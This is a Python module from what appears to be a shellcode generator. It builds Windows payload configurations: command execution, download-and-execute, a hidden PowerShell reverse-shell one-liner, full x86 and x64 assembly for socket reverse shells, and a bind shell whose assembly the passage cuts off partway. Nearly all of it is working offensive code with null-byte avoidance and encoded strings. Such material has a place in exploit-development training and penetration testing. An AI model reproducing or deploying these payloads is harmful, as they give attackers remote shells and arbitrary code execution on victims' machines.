"""
Payload Builders Module

High-level functions for building common shellgen payloads.
These are convenience functions that construct the configuration dicts
used by the architecture-specific generators.
"""

from lib.color_printer import printer


def windows_messagebox(title="Pwned", message="Hello from shellgen!", bad_chars=None):
    """
    Build a Windows MessageBox payload.

    MessageBoxA signature:
    int MessageBoxA(
      HWND   hWnd,      // NULL
      LPCSTR lpText,    // message text
      LPCSTR lpCaption, // title text
      UINT   uType      // MB_OK = 0
    );

    Args:
        title: MessageBox title (caption)
        message: MessageBox message (text)
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # Arguments must be in left-to-right order (generator will reverse for stdcall)
    # MessageBoxA(hWnd, lpText, lpCaption, uType)
    return {
        "bad_chars": bad_chars,
        "calls": [
            {
                "api": "MessageBoxA",
                "dll": "user32.dll",
                "args": [0, message, title, 0]
            }
        ],
        "exit": True
    }


def windows_winexec(command, show_window=1, bad_chars=None):
    """
    Build a Windows WinExec payload.

    Args:
        command: Command to execute
        show_window: Window visibility (0=hidden, 1=normal, 5=show)
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    return {
        "bad_chars": bad_chars,
        "calls": [
            {
                "api": "WinExec",
                "dll": "kernel32.dll",
                "args": [command, show_window]
            }
        ],
        "exit": True
    }


def windows_download_exec(url, save_path="C:\\\\windows\\\\temp\\\\payload.exe", bad_chars=None):
    """
    Build a Windows URLDownloadToFileA + WinExec payload.

    Uses pre-resolution mode for optimal shellgen size since this payload
    makes multiple API calls (URLDownloadToFileA + WinExec).

    Args:
        url: URL to download from
        save_path: Local path to save file
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Use pre-resolution for efficiency
        "calls": [
            {
                "api": "URLDownloadToFileA",
                "dll": "urlmon.dll",
                "args": [0, url, save_path, 0, 0]
            },
            {
                "api": "WinExec",
                "dll": "kernel32.dll",
                "args": [save_path, 1]
            }
        ],
        "exit": True
    }


def windows_createprocess(command, show_window=1, bad_chars=None):
    """
    Build a Windows CreateProcessA payload.

    CreateProcessA is more flexible than WinExec and allows for detailed
    process configuration including window state, handles, and security attributes.

    Uses pre-resolution mode for optimal shellgen size.

    Args:
        command: Command line to execute (e.g., "cmd.exe /c calc.exe")
        show_window: Window visibility (0=hidden, 1=normal, 5=show)
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # STARTUPINFOA and PROCESS_INFORMATION structures will be on stack
    # STARTUPINFOA.cb = 68 bytes, dwFlags = STARTF_USESHOWWINDOW (0x01)
    # wShowWindow = show_window parameter

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Use pre-resolution for efficiency
        "calls": [
            {
                "api": "CreateProcessA",
                "dll": "kernel32.dll",
                "args": [
                    0,              # lpApplicationName (NULL = use command line)
                    command,        # lpCommandLine
                    0,              # lpProcessAttributes (NULL)
                    0,              # lpThreadAttributes (NULL)
                    0,              # bInheritHandles (FALSE)
                    0,              # dwCreationFlags (0)
                    0,              # lpEnvironment (NULL = parent's environment)
                    0,              # lpCurrentDirectory (NULL = parent's directory)
                    "REG:esp",      # lpStartupInfo (pointer to STARTUPINFOA on stack)
                    "REG:esp"       # lpProcessInformation (pointer on stack)
                ]
            }
        ],
        "exit": True
    }


def windows_shellexecute(file_or_url, operation="open", parameters="", show_cmd=1, bad_chars=None):
    """
    Build a Windows ShellExecuteA payload.

    ShellExecuteA is powerful and can:
    - Execute programs
    - Open documents with default applications
    - Open URLs in default browser
    - Run verbs like "open", "edit", "print", "runas"

    Uses pre-resolution mode for optimal shellgen size.

    Args:
        file_or_url: File path, URL, or document to execute/open
        operation: Operation to perform ("open", "edit", "runas", etc.)
        parameters: Parameters to pass to the application
        show_cmd: Window show command (0=hide, 1=normal, 5=show)
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    args = [
        0,              # hwnd (NULL)
        operation,      # lpOperation ("open", "runas", etc.)
        file_or_url,    # lpFile
    ]

    # Only add parameters if provided (avoid empty string if not needed)
    if parameters:
        args.append(parameters)
    else:
        args.append(0)  # lpParameters (NULL)

    args.extend([
        0,              # lpDirectory (NULL = current directory)
        show_cmd        # nShowCmd
    ])

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Use pre-resolution for efficiency
        "calls": [
            {
                "api": "ShellExecuteA",
                "dll": "shell32.dll",
                "args": args
            }
        ],
        "exit": True
    }


def windows_system(command, bad_chars=None):
    """
    Build a Windows system() payload using msvcrt.dll.

    The system() function from the C runtime library executes a command
    via cmd.exe /c. This is useful for chaining commands or using shell features.

    Args:
        command: Command to execute (will be passed to cmd.exe /c)
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    return {
        "bad_chars": bad_chars,
        "calls": [
            {
                "api": "system",
                "dll": "msvcrt.dll",
                "args": [command]
            }
        ],
        "exit": True
    }


def windows_reverse_shell_powershell(host, port, bad_chars=None):
    """
    Build a Windows reverse shell payload using PowerShell (spawns child process).

    This creates a PowerShell reverse shell via WinExec. It's reliable but spawns
    a child process which may be more detectable.

    Args:
        host: Target IP address
        port: Target port
        bad_chars: Set of bad characters to avoid

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # PowerShell reverse shell
    ps_cmd = f'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($o2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"'

    return {
        "bad_chars": bad_chars,
        "calls": [
            {
                "api": "WinExec",
                "dll": "kernel32.dll",
                "args": [ps_cmd, 0]  # SW_HIDE
            }
        ],
        "exit": True
    }


def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
    """
    Build a native Windows socket reverse shell (runs in current process).

    This creates a true socket-based reverse shell using ws2_32.dll that redirects
    stdin/stdout/stderr to the socket and runs a shell in the current process.

    This implementation matches the proven working shellgen structure:
    1. Store kernel32.dll base after PEB walk
    2. Pre-resolve TerminateProcess, LoadLibraryA, CreateProcessA from kernel32
    3. Load ws2_32.dll
    4. Resolve all WS2_32 APIs (WSAStartup, WSASocketA, WSAConnect)
    5. Call WSAStartup
    6. Call WSASocketA
    7. Call WSAConnect
    8. Build STARTUPINFOA structure
    9. Build command string
    10. Call CreateProcessA
    11. Exit via TerminateProcess

    Args:
        host: Target IP address
        port: Target port
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute (default: "cmd.exe")
               Examples: "cmd.exe", "powershell.exe", "C:\\Windows\\System32\\cmd.exe"

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # Convert IP address to dword (network byte order)
    ip_parts = [int(x) for x in host.split('.')]
    ip_dword = (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (ip_parts[3] << 24)

    # Port in network byte order (swap bytes)
    port_word = ((port & 0xFF) << 8) | (port >> 8)

    # Build shell string push instructions using NEG encoding
    # We push the string in reverse (right to left) in 4-byte chunks
    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate

    # Pad to multiple of 4
    while len(shell_bytes) % 4 != 0:
        shell_bytes = b'\x00' + shell_bytes

    # Generate push instructions for shell string (reverse order)
    shell_asm = ""
    for i in range(len(shell_bytes) - 4, -1, -4):
        chunk = shell_bytes[i:i+4]
        dword = int.from_bytes(chunk, byteorder='little')

        # Use NEG encoding: neg eax to get the value
        # neg x = -x = ~x + 1 (two's complement)
        # So to encode dword, we need: -encoded = dword => encoded = -dword
        # But we need to handle it as unsigned 32-bit
        encoded = (0x100000000 - dword) & 0xFFFFFFFF

        shell_asm += f"    mov eax, 0x{encoded:08x}           ; Encoded value\n"
        shell_asm += f"    neg eax                       ; NEG to get 0x{dword:08x}\n"
        shell_asm += f"    push eax                      ; Push shell string chunk\n"

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
        "calls": [
            {
                "api": "TerminateProcess",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "CreateProcessA",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "_CUSTOM_REVERSE_SHELL",
                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
                "args": [],
                "custom_asm": f"""
    ; ===== After boilerplate with pre_resolve, we have: =====
    ; [ebp+0x04] = find_function address
    ; [ebp+0x08] = LoadLibraryA
    ; [ebp+0x10] = kernel32.dll base
    ; [ebp+0x14] = TerminateProcess (pre-resolved)
    ; [ebp+0x18] = CreateProcessA (pre-resolved)

    ; ===== Load ws2_32.dll using LoadLibraryA =====
    xor eax, eax
    mov ax, 0x6c6c                ; "ll"
    push eax
    push 0x642e3233               ; "32.d"
    push 0x5f327377               ; "ws2_"
    push esp                      ; Pointer to "ws2_32.dll"
    call dword ptr [ebp+0x08]     ; Call LoadLibraryA
    mov ebx, eax                  ; Save ws2_32.dll base in EBX

    ; Resolve WSAStartup
    push 0x3bfcedcb               ; WSAStartup hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x1c], eax           ; Save WSAStartup at [ebp+0x1c]

    ; Resolve WSASocketA
    push 0xadf509d9               ; WSASocketA hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x20], eax           ; Save WSASocketA at [ebp+0x20]

    ; Resolve WSAConnect
    push 0xb32dba0c               ; WSAConnect hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x24], eax           ; Save WSAConnect at [ebp+0x24]

    ; ===== Call WSAStartup =====
    mov eax, esp
    xor ecx, ecx
    mov cx, 0x590                 ; Allocate space for WSADATA
    sub eax, ecx
    push eax                      ; lpWSAData
    xor eax, eax
    mov ax, 0x0202                ; wVersionRequested = 2.2
    push eax
    call dword ptr [ebp+0x1c]     ; Call WSAStartup

    ; ===== Call WSASocketA =====
    xor eax, eax
    push eax                      ; dwFlags = 0
    push eax                      ; g = 0
    push eax                      ; lpProtocolInfo = NULL
    mov al, 0x06                  ; IPPROTO_TCP
    push eax
    sub al, 0x05                  ; SOCK_STREAM = 1
    push eax
    inc eax                       ; AF_INET = 2
    push eax
    call dword ptr [ebp+0x20]     ; Call WSASocketA
    mov esi, eax                  ; Save socket in ESI

    ; ===== Build sockaddr_in and call WSAConnect =====
    xor eax, eax
    push eax                      ; sin_zero[4-7]
    push eax                      ; sin_zero[0-3]
    push 0x{ip_dword:08x}         ; sin_addr (IP in network byte order)
    mov ax, 0x{port_word:04x}     ; sin_port (port in network byte order)
    shl eax, 0x10
    add ax, 0x02                  ; sin_family = AF_INET
    push eax
    push esp                      ; pointer to sockaddr_in
    pop edi                       ; Save sockaddr pointer in EDI

    xor eax, eax
    push eax                      ; lpGQOS = NULL
    push eax                      ; lpSQOS = NULL
    push eax                      ; lpCalleeData = NULL
    push eax                      ; lpCallerData = NULL
    add al, 0x10                  ; namelen = 16
    push eax
    push edi                      ; name = &sockaddr_in
    push esi                      ; s = socket
    call dword ptr [ebp+0x24]     ; Call WSAConnect

    ; ===== Build STARTUPINFOA =====
    push esi                      ; hStdError = socket
    push esi                      ; hStdOutput = socket
    push esi                      ; hStdInput = socket
    xor eax, eax
    push eax                      ; lpReserved2 = NULL
    push eax                      ; cbReserved2 & wShowWindow = 0
    mov al, 0x80
    xor ecx, ecx
    mov cl, 0x80
    add eax, ecx                  ; dwFlags = 0x100 (STARTF_USESTDHANDLES)
    push eax
    xor eax, eax
    push eax                      ; dwFillAttribute = 0
    push eax                      ; dwYCountChars = 0
    push eax                      ; dwXCountChars = 0
    push eax                      ; dwYSize = 0
    push eax                      ; dwXSize = 0
    push eax                      ; dwY = 0
    push eax                      ; dwX = 0
    push eax                      ; lpTitle = NULL
    push eax                      ; lpDesktop = NULL
    push eax                      ; lpReserved = NULL
    mov al, 0x44                  ; cb = 68 (sizeof STARTUPINFOA)
    push eax
    push esp                      ; pointer to STARTUPINFOA
    pop edi                       ; Save STARTUPINFOA pointer in EDI

    ; ===== Build command string "{shell}" =====
{shell_asm}    push esp                      ; Pointer to shell string
    pop ebx                       ; Save pointer to shell in EBX

    ; ===== Allocate PROCESS_INFORMATION and call CreateProcessA =====
    mov eax, esp
    xor ecx, ecx
    mov cx, 0x390                 ; Allocate space for PROCESS_INFORMATION
    sub eax, ecx
    push eax                      ; lpProcessInformation
    push edi                      ; lpStartupInfo (STARTUPINFOA pointer)
    xor eax, eax
    push eax                      ; lpCurrentDirectory = NULL
    push eax                      ; lpEnvironment = NULL
    push eax                      ; dwCreationFlags = 0
    inc eax                       ; bInheritHandles = TRUE
    push eax
    dec eax                       ; NULL
    push eax                      ; lpThreadAttributes = NULL
    push eax                      ; lpProcessAttributes = NULL
    push ebx                      ; lpCommandLine = command pointer
    push eax                      ; lpApplicationName = NULL

    ; ===== Call CreateProcessA (pre-resolved) =====
    call dword ptr [ebp+0x18]     ; Call CreateProcessA from pre-resolve

    ; ===== Exit with TerminateProcess (pre-resolved) =====
    xor ecx, ecx
    push ecx                      ; uExitCode = 0
    push 0xFFFFFFFF               ; hProcess = -1 (current process)
    call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve
"""
            }
        ],
        "exit": False  # We handle exit manually with TerminateProcess
    }


def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
    """
    Build a native Windows x64 socket reverse shell.

    This creates a true socket-based reverse shell using ws2_32.dll for x64 that:
    1. Pre-resolves CreateProcessA and TerminateProcess from kernel32
    2. Loads ws2_32.dll via LoadLibraryA
    3. Resolves WSAStartup, WSASocketA, and connect
    4. Calls WSAStartup to initialize Winsock
    5. Creates a socket via WSASocketA
    6. Connects to remote host:port
    7. Redirects stdin/stdout/stderr to the socket
    8. Executes shell with inherited handles

    Uses x64 fastcall convention (RCX, RDX, R8, R9, then stack) with shadow space.

    Args:
        host: Target IP address
        port: Target port
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute (default: "cmd.exe")
               Examples: "cmd.exe", "powershell.exe", "C:\\Windows\\System32\\cmd.exe"

    Returns:
        dict: Configuration for WindowsGenerator with arch='x64'
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # Convert IP address to qword (network byte order)
    ip_parts = [int(x) for x in host.split('.')]
    ip_dword = (ip_parts[0]) | (ip_parts[1] << 8) | (ip_parts[2] << 16) | (ip_parts[3] << 24)

    # Port in network byte order (swap bytes)
    port_word = ((port & 0xFF) << 8) | (port >> 8)

    # Build sockaddr_in: AF_INET (2) | port (2 bytes) | IP (4 bytes) | padding (8 bytes)
    # Packed as qword for easier setup
    sockaddr_qword = 0x02 | (port_word << 16) | (ip_dword << 32)

    # Build shell string storage instructions using NEG encoding for x64
    # We store the string in memory at [r15+0x180] using 8-byte chunks
    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate

    # Pad to multiple of 8 for x64
    while len(shell_bytes) % 8 != 0:
        shell_bytes = b'\x00' + shell_bytes

    # Generate mov instructions for shell string (reverse order for little-endian)
    shell_asm = "    mov rdx, r15                    ; RDX = base for shell string\n"
    shell_asm += "    add rdx, 0x180                  ; Offset for shell string storage\n"

    offset = 0
    for i in range(len(shell_bytes) - 8, -1, -8):
        chunk = shell_bytes[i:i+8]
        qword = int.from_bytes(chunk, byteorder='little')

        # Use NEG encoding: neg rax to get the value
        # For x64, we encode as: -encoded = qword => encoded = -qword
        encoded = (0x10000000000000000 - qword) & 0xFFFFFFFFFFFFFFFF

        shell_asm += f"    mov rax, 0x{encoded:016x}   ; Encoded value\n"
        shell_asm += f"    neg rax                       ; NEG to get 0x{qword:016x}\n"
        shell_asm += f"    mov [rdx+{offset:#x}], rax          ; Store shell string chunk\n"
        offset += 8

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
        "calls": [
            {
                "api": "TerminateProcess",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "CreateProcessA",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "_CUSTOM_REVERSE_SHELL_X64",
                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
                "args": [],
                "custom_asm": f"""
    ; ===== After boilerplate with pre_resolve, we have: =====
    ; [rbp+0x08] = lookup_func address
    ; [rbp+0x10] = LoadLibraryA (resolved by boilerplate)
    ; [rbp+0x14] = TerminateProcess (pre-resolved)
    ; [rbp+0x1c] = CreateProcessA (pre-resolved)
    ; [rbp+0x20] = kernel32/kernelbase base
    ; We'll use R15 as our workspace base pointer

    mov r15, rbp                    ; R15 = workspace base

    ; ===== Load ws2_32.dll string and call LoadLibraryA =====
    call_loadlibrarya:
    mov rcx, 0x642e32335f327377    ; "ws2_32.d"
    mov [r15+0x100], rcx
    mov rcx, 0x6c6c                 ; "ll"
    mov [r15+0x108], rcx
    lea rcx, [r15+0x100]            ; RCX = pointer to "ws2_32.dll"
    mov rax, [r15+0x10]             ; RAX = LoadLibraryA
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space
    mov rdi, rax                    ; RDI = ws2_32.dll base

    ; ===== Resolve WSAStartup =====
    locate_wsastartup:
    mov edx, 0x3bfcedcb             ; WSAStartup hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0x98], rax             ; Save WSAStartup

    ; ===== Resolve WSASocketA =====
    locate_wsasocketa:
    mov edx, 0xadf509d9             ; WSASocketA hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0xa0], rax             ; Save WSASocketA

    ; ===== Resolve connect =====
    locate_connect:
    mov edx, 0x060aaf9ec            ; connect hash
    call qword ptr [r15+0x08]       ; Call lookup_func
    mov [r15+0xa8], rax             ; Save connect

    ; ===== Call WSAStartup(0x202, lpWSAData) =====
    call_wsastartup:
    mov rcx, 0x202                  ; RCX = wVersionRequested (2.2)
    lea rdx, [r15+0x200]            ; RDX = lpWSAData
    mov rax, [r15+0x98]             ; RAX = WSAStartup
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space

    ; ===== Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0) =====
    call_wsasocketa:
    mov ecx, 2                      ; RCX = AF_INET
    mov edx, 1                      ; RDX = SOCK_STREAM
    mov r8, 6                       ; R8 = IPPROTO_TCP
    xor r9, r9                      ; R9 = lpProtocolInfo = NULL
    sub rsp, 0x30                   ; Shadow space (0x20) + 2 stack args (0x10)
    mov qword ptr [rsp+0x20], r9    ; [rsp+0x20] = g = NULL
    mov qword ptr [rsp+0x28], r9    ; [rsp+0x28] = dwFlags = 0
    mov rax, [r15+0xa0]             ; RAX = WSASocketA
    call rax
    add rsp, 0x30                   ; Clean up
    mov rsi, rax                    ; RSI = socket handle

    ; ===== Build sockaddr_in and call connect(socket, &sockaddr, sizeof) =====
    call_connect:
    mov rcx, rax                    ; RCX = socket
    mov r8, 0x10                    ; R8 = namelen = 16
    lea rdx, [r15+0x220]            ; RDX = name = &sockaddr_in
    mov r9, 0x{sockaddr_qword:016x} ; sockaddr_in packed as qword
    mov [rdx], r9                   ; Store sockaddr_in structure
    xor r9, r9
    mov [rdx+8], r9                 ; Zero out padding
    mov rax, [r15+0xa8]             ; RAX = connect
    sub rsp, 0x20                   ; Shadow space
    call rax
    add rsp, 0x20                   ; Clean up shadow space

    ; ===== Setup STARTUPINFOA and PROCESS_INFORMATION =====
    setup_si_and_pi:
    mov rdi, r15                    ; RDI = workspace base
    add rdi, 0x300                  ; RDI = lpProcessInformation and lpStartupInfo
    mov rbx, rdi                    ; RBX = lpStartupInfo
    xor eax, eax
    mov ecx, 0x20                   ; Zero 0x80 bytes (32 qwords)
    rep stosd                       ; Clear memory
    mov eax, 0x68                   ; EAX = sizeof(STARTUPINFOA) = 104 bytes
    mov [rbx], eax                  ; lpStartupInfo.cb
    mov eax, 0x100                  ; EAX = STARTF_USESTDHANDLES
    mov [rbx+0x3c], eax             ; lpStartupInfo.dwFlags
    mov [rbx+0x50], rsi             ; lpStartupInfo.hStdInput = socket
    mov [rbx+0x58], rsi             ; lpStartupInfo.hStdOutput = socket
    mov [rbx+0x60], rsi             ; lpStartupInfo.hStdError = socket

    ; ===== Build command string "{shell}" =====
    call_createprocessa:
{shell_asm}
    xor ecx, ecx                    ; RCX = lpApplicationName = NULL
    lea rdx, [r15+0x180]            ; RDX = lpCommandLine (points to shell string)
    xor r8, r8                      ; R8 = lpProcessAttributes = NULL
    xor r9, r9                      ; R9 = lpThreadAttributes = NULL
    sub rsp, 0x50                   ; Shadow space + 6 stack args (0x20 + 0x30)
    xor eax, eax
    inc eax                         ; EAX = 1
    mov [rsp+0x20], rax             ; [rsp+0x20] = bInheritHandles = TRUE
    dec eax                         ; EAX = 0
    mov [rsp+0x28], rax             ; [rsp+0x28] = dwCreationFlags = 0
    mov [rsp+0x30], rax             ; [rsp+0x30] = lpEnvironment = NULL
    mov [rsp+0x38], rax             ; [rsp+0x38] = lpCurrentDirectory = NULL
    mov [rsp+0x40], rbx             ; [rsp+0x40] = lpStartupInfo
    add rbx, 0x68                   ; RBX = lpProcessInformation (past lpStartupInfo)
    mov [rsp+0x48], rbx             ; [rsp+0x48] = lpProcessInformation

    ; Call CreateProcessA (pre-resolved by boilerplate)
    mov rax, [r15+0x1c]             ; RAX = CreateProcessA (pre-resolved)
    call rax                        ; Call CreateProcessA
    add rsp, 0x50                   ; Clean up

    ; ===== Call TerminateProcess(-1, 0) to exit =====
    call_terminateprocess:
    xor rcx, rcx
    dec rcx                         ; RCX = -1 (current process)
    xor rdx, rdx                    ; RDX = exit code = 0

    ; Call TerminateProcess (pre-resolved by boilerplate)
    mov rax, [r15+0x14]             ; RAX = TerminateProcess (pre-resolved)
    sub rsp, 0x20                   ; Shadow space
    call rax                        ; Call TerminateProcess
    add rsp, 0x20                   ; Clean up shadow space
"""
            }
        ],
        "exit": False  # We handle exit manually with TerminateProcess
    }


def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
    """
    Build a native Windows socket bind shell (runs in current process).

    This creates a true socket-based bind shell using ws2_32.dll that:
    1. Creates a socket
    2. Binds to 0.0.0.0:port
    3. Listens for incoming connections
    4. Accepts a connection
    5. Redirects stdin/stdout/stderr to the accepted socket
    6. Runs a shell in the current process

    This implementation structure:
    1. Store kernel32.dll base after PEB walk
    2. Resolve LoadLibraryA
    3. Load ws2_32.dll
    4. Resolve all WS2_32 APIs (WSAStartup, WSASocketA, bind, listen, accept)
    5. Resolve CreateProcessA from kernel32
    6. Resolve TerminateProcess from kernel32
    7. Call WSAStartup
    8. Call WSASocketA
    9. Call bind (0.0.0.0:port)
    10. Call listen
    11. Call accept
    12. Build STARTUPINFOA structure
    13. Build command string
    14. Call CreateProcessA
    15. Exit via TerminateProcess

    Args:
        port: Port to bind to
        bad_chars: Set of bad characters to avoid
        shell: Shell to execute (default: "cmd.exe")
               Examples: "cmd.exe", "powershell.exe", "C:\\Windows\\System32\\cmd.exe"

    Returns:
        dict: Configuration for X86WindowsGenerator
    """
    if bad_chars is None:
        bad_chars = {0x00}

    # Port in network byte order (swap bytes)
    port_word = ((port & 0xFF) << 8) | (port >> 8)

    # Build shell string push instructions using NEG encoding
    # We push the string in reverse (right to left) in 4-byte chunks
    shell_bytes = shell.encode('ascii') + b'\x00'  # null-terminate

    # Pad to multiple of 4
    while len(shell_bytes) % 4 != 0:
        shell_bytes = b'\x00' + shell_bytes

    # Generate push instructions for shell string (reverse order)
    shell_asm = ""
    for i in range(len(shell_bytes) - 4, -1, -4):
        chunk = shell_bytes[i:i+4]
        dword = int.from_bytes(chunk, byteorder='little')

        # Use NEG encoding: neg eax to get the value
        # neg x = -x = ~x + 1 (two's complement)
        # So to encode dword, we need: -encoded = dword => encoded = -dword
        # But we need to handle it as unsigned 32-bit
        encoded = (0x100000000 - dword) & 0xFFFFFFFF

        shell_asm += f"    mov eax, 0x{encoded:08x}           ; Encoded value\n"
        shell_asm += f"    neg eax                       ; NEG to get 0x{dword:08x}\n"
        shell_asm += f"    push eax                      ; Push shell string chunk\n"

    return {
        "bad_chars": bad_chars,
        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
        "calls": [
            {
                "api": "TerminateProcess",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "CreateProcessA",
                "dll": "kernel32.dll",
                "args": []  # Dummy, won't be called via generator
            },
            {
                "api": "_CUSTOM_BIND_SHELL",
                "dll": "ws2_32.dll",  # This will trigger LoadLibraryA for ws2_32.dll
                "args": [],
                "custom_asm": f"""
    ; ===== After boilerplate with pre_resolve, we have: =====
    ; [ebp+0x04] = find_function address
    ; [ebp+0x08] = LoadLibraryA
    ; [ebp+0x10] = kernel32.dll base
    ; [ebp+0x14] = TerminateProcess (pre-resolved)
    ; [ebp+0x18] = CreateProcessA (pre-resolved)

    ; ===== Load ws2_32.dll using LoadLibraryA =====
    xor eax, eax
    mov ax, 0x6c6c                ; "ll"
    push eax
    push 0x642e3233               ; "32.d"
    push 0x5f327377               ; "ws2_"
    push esp                      ; Pointer to "ws2_32.dll"
    call dword ptr [ebp+0x08]     ; Call LoadLibraryA (from boilerplate)
    mov ebx, eax                  ; Save ws2_32.dll base in EBX

    ; Resolve WSAStartup
    push 0x3bfcedcb               ; WSAStartup hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x1c], eax           ; Save WSAStartup at [ebp+0x1c]

    ; Resolve WSASocketA
    push 0xadf509d9               ; WSASocketA hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x20], eax           ; Save WSASocketA at [ebp+0x20]

    ; Resolve bind
    push 0xc7701aa4               ; bind hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x24], eax           ; Save bind at [ebp+0x24]

    ; Resolve listen
    push 0xe92eada4               ; listen hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x28], eax           ; Save listen at [ebp+0x28]

    ; Resolve accept
    push 0xede03f7e               ; accept hash
    call dword ptr [ebp+0x04]     ; Call find_function
    mov [ebp+0x34], eax           ; Save accept at [ebp+0x34]

    ; ===== Call WSAStartup =====
    mov eax, esp
    xor ecx, ecx
    mov cx, 0x590                 ; Allocate space for WSADATA
    sub eax, ecx
    push eax                      ; lpWSAData
    xor eax, eax
    mov ax, 0x0202                ; wVersionRequested = 2.2
    push eax
    call dword ptr [ebp+0x1c]     ; Call WSAStartup

    ; ===== Call WSASocketA =====
    xor eax, eax
    push eax                      ; dwFlags = 0
    push eax                      ; g = 0
    push eax                      ; lpProtocolInfo = NULL
    mov al, 0x06                  ; IPPROTO_TCP
    push eax
    sub al, 0x05                  ; SOCK_STREAM = 1
    push eax
    inc eax                       ; AF_INET = 2
    push eax
    call dword ptr [ebp+0x20]     ; Call WSASocketA
    mov edi, eax                  ; Save socket in EDI

    ; ===== Build sockaddr_in and call bind =====
    xor eax, eax
    push eax                      ; sin_zero[4-7]
    push eax                      ; sin_zero[0-3]
    push eax                      ; sin_addr = 0.0.0.0 (INADDR_ANY)
    mov ax, 0x{port_word:04x}     ; sin_port (port in network byte order)
    shl eax, 0x10
    add ax, 0x02                  ; sin_family = AF_INET
    push eax
    push esp                      ; pointer to sockaddr_in
    pop ebx                       ; Save sockaddr pointer in EBX

    xor eax, eax
    add al, 0x10                  ; namelen = 16
    push eax
    push ebx                      ; name = &sockaddr_in
    push edi                      ; s = socket
    call dword ptr [ebp+0x24]     ; Call bind

    ; ===== Call listen =====
    xor eax, eax
    push eax                      ; backlog = 0 (default)
    push edi                      ; s = socket
    call dword ptr [ebp+0x28]     ; Call listen

    ; ===== Call accept =====
    xor eax, eax
    push eax                      ; addrlen = NULL
    push eax                      ; addr = NULL
    push edi                      ; s = socket
    call dword ptr [ebp+0x34]     ; Call accept
    mov esi, eax                  ; Save accepted socket in ESI

    ; ===== Build STARTUPINFOA =====
    push esi                      ; hStdError = accepted socket
    push esi                      ; hStdOutput = accepted socket
    push esi                      ; hStdInput = accepted socket
    xor eax, eax
    push eax                      ; lpReserved2 = NULL
    push eax                      ; cbReserved2 & wShowWindow = 0
    mov al, 0x80
    xor ecx, ecx
    mov cl, 0x80
    add eax, ecx                  ; dwFlags = 0x100 (STARTF_USESTDHANDLES)
    push eax
    xor eax, eax
    push eax                      ; dwFillAttribute = 0
    push eax                      ; dwYCountChars = 0
    push eax                      ; dwXCountChars = 0
    push eax                      ; dwYSize = 0
    push eax                      ; dwXSize = 0
    push eax                      ; dwY = 0
    push eax                      ; dwX = 0
    push eax                      ; lpTitle = NULL
    push eax                      ; lpDesktop = NULL
    push eax                      ; lpReserved = NULL
    mov al, 0x44                  ; cb = 68 (sizeof STARTUPINFOA)
    push eax
    push esp                      ; pointer to STARTUPINFOA
